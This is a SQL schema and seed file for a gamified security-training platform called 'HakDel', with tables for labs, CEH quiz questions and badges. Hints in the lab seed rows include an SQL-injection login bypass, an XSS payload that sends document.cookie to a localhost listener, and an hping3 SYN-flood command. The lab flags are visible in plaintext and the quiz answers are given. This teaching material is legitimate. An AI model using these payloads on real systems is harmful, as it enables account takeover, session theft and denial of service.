-- HakDel Database Schema
-- Run this in XAMPP phpMyAdmin or: mysql -u root -p hakdel < schema.sql

CREATE DATABASE IF NOT EXISTS hakdel CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE hakdel;

-- ─────────────────────────────────────────────
-- USERS
-- ─────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS users (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    username      VARCHAR(40)  NOT NULL UNIQUE,
    email         VARCHAR(120) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    role          ENUM('student','admin') NOT NULL DEFAULT 'student',
    xp            INT UNSIGNED NOT NULL DEFAULT 0,
    level         TINYINT UNSIGNED NOT NULL DEFAULT 1,
    streak_days   TINYINT UNSIGNED NOT NULL DEFAULT 0,
    last_active   DATE,
    avatar_initials VARCHAR(3),
    created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- ─────────────────────────────────────────────
-- SESSIONS (PHP auth)
-- ─────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS sessions (
    token         CHAR(64)     PRIMARY KEY,
    user_id       INT UNSIGNED NOT NULL,
    expires_at    DATETIME     NOT NULL,
    created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- ─────────────────────────────────────────────
-- SCANS
-- ─────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS scans (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id       INT UNSIGNED,                          -- NULL = anonymous
    job_id        CHAR(36)     NOT NULL UNIQUE,          -- UUID from FastAPI
    target_url    VARCHAR(500) NOT NULL,
    profile       ENUM('quick','full','custom') DEFAULT 'quick',
    modules       JSON,                                  -- array of module names
    status        ENUM('pending','running','done','error') DEFAULT 'pending',
    score         TINYINT UNSIGNED,
    grade         VARCHAR(3),
    summary       TEXT,
    result_json   LONGTEXT,                              -- full findings JSON
    scanned_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL,
    INDEX idx_user (user_id),
    INDEX idx_status (status)
);

-- ─────────────────────────────────────────────
-- LABS
-- ─────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS labs (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    slug          VARCHAR(60)  NOT NULL UNIQUE,          -- e.g. "sqli-101"
    title         VARCHAR(120) NOT NULL,
    description   TEXT,
    category      VARCHAR(60),                           -- e.g. "Web Exploitation"
    difficulty    ENUM('easy','medium','hard','expert') DEFAULT 'easy',
    xp_reward     SMALLINT UNSIGNED DEFAULT 100,
    level_required TINYINT UNSIGNED DEFAULT 1,
    flag_hash     CHAR(64),                              -- SHA256 of correct flag
    instructions  LONGTEXT,                              -- Markdown
    hints         JSON,                                  -- array of hint strings
    is_active     BOOLEAN DEFAULT TRUE,
    sort_order    SMALLINT UNSIGNED DEFAULT 0,
    created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS lab_attempts (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id       INT UNSIGNED NOT NULL,
    lab_id        INT UNSIGNED NOT NULL,
    status        ENUM('started','solved','failed') DEFAULT 'started',
    attempts_count TINYINT UNSIGNED DEFAULT 0,
    solved_at     DATETIME,
    started_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (lab_id)  REFERENCES labs(id)  ON DELETE CASCADE,
    UNIQUE KEY unique_user_lab (user_id, lab_id)
);

-- ─────────────────────────────────────────────
-- CEH QUIZ
-- ─────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS quiz_questions (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    domain        VARCHAR(80),                           -- e.g. "Scanning Networks"
    domain_number TINYINT UNSIGNED,                      -- CEH domain 1-20
    question      TEXT NOT NULL,
    option_a      VARCHAR(400) NOT NULL,
    option_b      VARCHAR(400) NOT NULL,
    option_c      VARCHAR(400) NOT NULL,
    option_d      VARCHAR(400) NOT NULL,
    correct       ENUM('a','b','c','d') NOT NULL,
    explanation   TEXT,
    difficulty    ENUM('easy','medium','hard') DEFAULT 'medium',
    is_active     BOOLEAN DEFAULT TRUE,
    created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS quiz_attempts (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id       INT UNSIGNED NOT NULL,
    question_id   INT UNSIGNED NOT NULL,
    answer        ENUM('a','b','c','d') NOT NULL,
    is_correct    BOOLEAN NOT NULL,
    answered_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id)     REFERENCES users(id)           ON DELETE CASCADE,
    FOREIGN KEY (question_id) REFERENCES quiz_questions(id)  ON DELETE CASCADE,
    INDEX idx_user_quiz (user_id)
);

-- ─────────────────────────────────────────────
-- BADGES
-- ─────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS badges (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    slug          VARCHAR(60)  NOT NULL UNIQUE,
    name          VARCHAR(80)  NOT NULL,
    description   VARCHAR(255),
    icon          VARCHAR(10),                           -- emoji
    condition_type ENUM('labs_solved','xp_reached','streak','quiz_score','scan_count'),
    condition_value INT UNSIGNED
);

CREATE TABLE IF NOT EXISTS user_badges (
    user_id       INT UNSIGNED NOT NULL,
    badge_id      INT UNSIGNED NOT NULL,
    earned_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (user_id, badge_id),
    FOREIGN KEY (user_id)  REFERENCES users(id)  ON DELETE CASCADE,
    FOREIGN KEY (badge_id) REFERENCES badges(id) ON DELETE CASCADE
);

-- ─────────────────────────────────────────────
-- SEED DATA
-- ─────────────────────────────────────────────

-- Default badges
INSERT IGNORE INTO badges (slug, name, description, icon, condition_type, condition_value) VALUES
('first-scan',    'First Scan',       'Ran your first site scan',            '🔍', 'scan_count',  1),
('scanner-pro',   'Scanner Pro',      'Completed 10 scans',                  '🛡️', 'scan_count',  10),
('lab-newbie',    'Lab Rat',          'Solved your first lab',               '🧪', 'labs_solved', 1),
('lab-veteran',   'Lab Veteran',      'Solved 10 labs',                      '⚡', 'labs_solved', 10),
('quiz-starter',  'Quiz Starter',     'Answered 10 CEH questions',           '📝', 'quiz_score',  10),
('streak-7',      '7-Day Streak',     'Active 7 days in a row',              '🔥', 'streak',      7),
('level-5',       'Level 5',          'Reached Level 5',                     '🏆', 'xp_reached',  500),
('level-10',      'Level 10',         'Reached Level 10',                    '💎', 'xp_reached',  1000);

-- Seed labs
INSERT IGNORE INTO labs (slug, title, description, category, difficulty, xp_reward, level_required, flag_hash, instructions, hints) VALUES
(
  'sqli-101',
  'SQL Injection 101',
  'Exploit a vulnerable login form using classic SQLi payloads.',
  'Web Exploitation',
  'easy', 120, 1,
  SHA2('flag{sqli_bypass_auth_success}', 256),
  '## SQL Injection 101\n\nA local vulnerable web app is running at `http://localhost:9001`.\n\nYour goal: bypass the login form without knowing the password.\n\n### Steps\n1. Start the lab VM or Docker container\n2. Navigate to the login page\n3. Try classic SQLi payloads in the username field\n4. Retrieve the flag from the dashboard\n\n### What you will learn\n- How SQL injection works at the query level\n- Why unsanitized inputs are dangerous\n- How to test for SQLi manually\n- Basic UNION-based extraction',
  '["Try entering a single quote '' to test for errors", "The classic payload is: '' OR ''1''=''1", "Look at the URL after login for the flag"]'
),
(
  'xss-cookie-steal',
  'XSS Cookie Hijack',
  'Inject a script to steal a session cookie and demonstrate session hijacking.',
  'Web Exploitation',
  'medium', 200, 3,
  SHA2('flag{xss_cookie_stolen_session}', 256),
  '## XSS Cookie Hijack\n\nA vulnerable comment box is running locally.\n\nYour goal: steal the admin session cookie using a reflected XSS payload.\n\n### Steps\n1. Find the vulnerable input field\n2. Craft a `<script>` payload that exfiltrates `document.cookie`\n3. Set up a listener (netcat or Python HTTP server)\n4. Submit the payload and capture the cookie\n5. Use the cookie to impersonate the admin\n\n### What you will learn\n- Reflected vs stored XSS\n- Cookie flags: HttpOnly, Secure, SameSite\n- Why CSP prevents this\n- Session hijacking mechanics',
  '["Try: <script>alert(1)</script> first to confirm XSS", "Use: <script>document.location=''http://localhost:9999/?c=''+document.cookie</script>", "Start a Python listener: python3 -m http.server 9999"]'
),
(
  'syn-flood-lab',
  'SYN Flood Simulation',
  'Simulate a SYN flood attack on a controlled local target and observe the TCP state.',
  'Network Attacks',
  'medium', 180, 3,
  SHA2('flag{syn_flood_half_open_connections}', 256),
  '## SYN Flood Simulation\n\n**Only run this on your local machine or authorized lab environment.**\n\nYour goal: understand how a SYN flood exhausts TCP connections.\n\n### Steps\n1. Run the vulnerable server: `python3 lab-server.py`\n2. Use hping3 or Scapy to send SYN packets\n3. Observe the half-open connections with `netstat -an`\n4. Find the flag in the server log after 100 SYNs\n\n### What you will learn\n- TCP 3-way handshake internals\n- How SYN cookies defend against this\n- How Smurf attacks differ\n- Rate limiting and IDS signatures',
  '["hping3 command: hping3 -S --flood -V -p 8080 127.0.0.1", "Check connections: netstat -an | grep SYN_RECV", "The flag appears in server.log after the threshold"]'
);

-- Seed CEH quiz questions (Domain 3: Scanning Networks)
INSERT IGNORE INTO quiz_questions (domain, domain_number, question, option_a, option_b, option_c, option_d, correct, explanation, difficulty) VALUES
(
  'Scanning Networks', 3,
  'Which scanning technique sends a SYN packet and, upon receiving SYN-ACK, immediately sends RST to avoid completing the handshake?',
  'Full connect scan', 'SYN stealth scan', 'XMAS scan', 'FIN scan',
  'b',
  'SYN stealth (half-open) scan never completes the 3-way handshake. It sends SYN, receives SYN-ACK, then sends RST. This avoids logging on many systems.',
  'easy'
),
(
  'Scanning Networks', 3,
  'An XMAS scan works by setting which combination of TCP flags?',
  'SYN + ACK', 'FIN + URG + PSH', 'RST + SYN', 'ACK + FIN',
  'b',
  'XMAS scan lights up the FIN, URG, and PSH flags simultaneously — like a Christmas tree. Open ports ignore it; closed ports respond with RST.',
  'medium'
),
(
  'Footprinting', 1,
  'Which of the following is a passive footprinting technique?',
  'Port scanning with nmap', 'Sending ICMP echo requests', 'Searching WHOIS records', 'Banner grabbing via Telnet',
  'c',
  'Passive footprinting collects information without directly interacting with the target. WHOIS lookups query third-party registrar databases, leaving no trace on the target.',
  'easy'
),
(
  'System Hacking', 6,
  'Which phase of system hacking involves hiding tools and maintaining access after exploitation?',
  'Scanning', 'Gaining access', 'Escalating privileges', 'Covering tracks and maintaining access',
  'd',
  'After gaining and escalating access, attackers cover tracks (clear logs, hide tools) and maintain access (rootkits, backdoors). This is phase 4 of the CEH system hacking methodology.',
  'medium'
),
(
  'Malware Threats', 7,
  'A Trojan horse differs from a virus primarily because:',
  'It replicates itself across the network', 'It requires user interaction to execute', 'It appears as legitimate software but carries a malicious payload', 'It only targets Linux systems',
  'c',
  'Trojans masquerade as benign programs. Unlike viruses, they do not self-replicate. The user runs them voluntarily, triggering the hidden malicious payload.',
  'easy'
),
(
  'Sniffing', 8,
  'Which tool is most commonly used for packet capture and protocol analysis?',
  'Nmap', 'Metasploit', 'Wireshark', 'Burp Suite',
  'c',
  'Wireshark is the industry-standard GUI packet analyser. It captures live traffic and decodes protocols across all layers of the OSI model.',
  'easy'
),
(
  'Denial of Service', 10,
  'A Smurf attack amplifies traffic by sending ICMP requests to a broadcast address with a spoofed source IP. What is the spoofed source set to?',
  'The attacker''s IP', 'A random public IP', 'The victim''s IP', 'The gateway IP',
  'c',
  'In a Smurf attack, the spoofed source IP is the victim''s IP. All broadcast recipients reply to the victim, amplifying the attack volume by the number of hosts on the subnet.',
  'medium'
),
(
  'Session Hijacking', 9,
  'Which of the following best describes a session fixation attack?',
  'Stealing a session token after authentication', 'Forcing a user to authenticate with a known session token', 'Replaying captured authentication packets', 'Injecting SQL to retrieve session data',
  'b',
  'Session fixation forces the victim to use a session ID chosen by the attacker before login. After the victim authenticates, the attacker uses that same ID to hijack the session.',
  'hard'
);
